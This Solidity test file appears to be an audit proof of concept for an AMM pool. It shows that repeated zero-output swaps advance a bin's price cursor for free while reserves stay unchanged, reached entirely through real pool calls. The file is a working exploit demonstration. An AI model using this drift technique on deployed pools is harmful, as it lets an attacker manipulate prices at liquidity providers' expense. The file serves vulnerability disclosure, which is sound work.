// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MetricOmmPoolBaseTest, Q64} from "./MetricOmmPool.base.t.sol";
import {SwapMath, MAX_POS_BIN} from "../contracts/libraries/SwapMath.sol";

/// @notice Reachability-only PoC answering the specific objection that the zero-output
/// cursor-desync precondition "is not reachable as described" and that the original test
/// "creates this state manually instead of reaching it through the pool".
///
/// NOTHING here is hand-built: no vm.store, no BinState literal, no constructor-seeded
/// balances. The pool is the standard base-test deployment (lengthE6 = 100, a production
/// value; price bounds derived by the pool itself, not passed in by the test). Liquidity
/// arrives through a real addLiquidity at the protocol's own minimalMintableLiquidity, the
/// cursor is positioned by a real honest swap, and every drift step is a real pool.swap().
///
/// The objection assumes the free step size is governed by absolute depletion ("when token0
/// reaches one unit, the cursor is already near that edge"). The actual governing condition,
/// from calculateOutputToken0FromBinPosition, is:
///
///     out0 = availableToken0 * (finalPos - currPos) / (MAX_POS_BIN - currPos)
///     out0 == 0   <=>   (finalPos - currPos) < (MAX_POS_BIN - currPos) / availableToken0
///
/// The free step is therefore a FRACTION (1/availableToken0) of the REMAINING distance, not
/// an absolute quantity. A bin seeded at minimum liquidity has a small availableToken0 at
/// every cursor position -- including a cursor nowhere near the depleted edge -- so the step
/// stays large in relative terms and the moves compound.
contract CursorDesyncReachabilityThroughPoolTest is MetricOmmPoolBaseTest {
  uint256 internal constant BIN_E6 = 100; // the base pool's own bin width, unmodified

  uint256 internal startPos;
  uint256 internal endPos;
  uint256 internal driftSteps;
  uint104 internal bal0Start;
  uint104 internal bal1Start;

  function _upperX64() internal pure returns (uint256) {
    return Math.mulDiv(Q64, 1e6 + BIN_E6, 1e6);
  }

  /// @dev One free-drift attempt. Returns false when no further progress is possible.
  function _driftOnce() internal returns (bool) {
    uint256 cursor = _getCurPosInBin();
    (uint104 pre0, uint104 pre1,,,) = _getBinState(0);
    if (pre0 == 0) return false;

    uint256 step = (MAX_POS_BIN - cursor - 1) / (uint256(pre0) + 2);
    if (step == 0) return false;

    uint128 limit =
      uint128(SwapMath.calculatePriceAtBinPosition(Q64, _upperX64(), cursor + step, Math.Rounding.Ceil));

    (int256 d0, int256 d1) = _swap(3, users[3], false, 2, limit);

    // The whole point: a real swap that transfers nothing, charges nothing...
    assertEq(d0, 0, "drift step must transfer zero token0");
    assertEq(d1, 0, "drift step must transfer zero token1");

    (uint104 post0, uint104 post1,,,) = _getBinState(0);
    assertEq(post0, pre0, "reserves frozen across drift step (token0)");
    assertEq(post1, pre1, "reserves frozen across drift step (token1)");

    // ...yet the cursor moved.
    if (_getCurPosInBin() <= cursor) return false;
    return true;
  }

  function test_reachability_freeDriftFromAHonestlyReachedState() public {
    // ---- 1. Real liquidity, at the protocol's own documented minimum. ----
    _addLiquidity(1, 0, 0, MINIMAL_MINTABLE_LIQUIDITY, 11);

    // ---- 2. A real, honest, paid swap positions the cursor. Nothing exotic: an
    // ordinary exact-output buy of part of the bin's token0. ----
    (int256 setupD0, int256 setupD1) = _swap(3, users[3], false, -500, type(uint128).max);
    assertLt(setupD0, 0, "setup swap really paid out token0");
    assertGt(setupD1, 0, "setup swap really collected token1");

    startPos = _getCurPosInBin();
    (bal0Start, bal1Start,,,) = _getBinState(0);

    emit log_named_uint("cursor after honest setup (x1e6 of MAX)", Math.mulDiv(startPos, 1e6, MAX_POS_BIN));
    emit log_named_uint("bin token0 at that cursor", bal0Start);
    emit log_named_uint("bin token1 at that cursor", bal1Start);
    emit log_named_uint(
      "remaining distance to edge (x1e6 of MAX)", Math.mulDiv(MAX_POS_BIN - startPos, 1e6, MAX_POS_BIN)
    );

    // This is the state the objection says cannot exist: a SMALL absolute token0 balance
    // while the cursor still has most of the bin ahead of it.
    assertGt(bal0Start, 0, "bin still holds token0");
    assertGt(bal1Start, 0, "bin still holds token1");
    assertLt(bal0Start, 1000, "token0 balance is small in absolute scaled units");
    assertGt(MAX_POS_BIN - startPos, MAX_POS_BIN / 2, "cursor still has >50% of the bin left to travel");

    // ---- 3. Free drift: every call is a real pool.swap() that must move zero tokens. ----
    while (driftSteps < 4000) {
      if (!_driftOnce()) break;
      driftSteps++;
    }
    endPos = _getCurPosInBin();

    _report();
  }

  function _report() internal {
    (uint104 bal0End, uint104 bal1End,,,) = _getBinState(0);

    emit log_named_uint("free drift steps executed", driftSteps);
    emit log_named_uint("cursor start (x1e6 of MAX)", Math.mulDiv(startPos, 1e6, MAX_POS_BIN));
    emit log_named_uint("cursor end   (x1e6 of MAX)", Math.mulDiv(endPos, 1e6, MAX_POS_BIN));
    emit log_named_uint("bin token0 start", bal0Start);
    emit log_named_uint("bin token0 end  ", bal0End);
    emit log_named_uint("bin token1 start", bal1Start);
    emit log_named_uint("bin token1 end  ", bal1End);

    // Reserves provably untouched across the entire drift campaign.
    assertEq(bal0End, bal0Start, "token0 reserve identical before and after all drift");
    assertEq(bal1End, bal1Start, "token1 reserve identical before and after all drift");
    assertGt(driftSteps, 1, "drift is repeatable, not a one-shot");
    assertGt(endPos, startPos, "cursor materially advanced for free");
  }
}
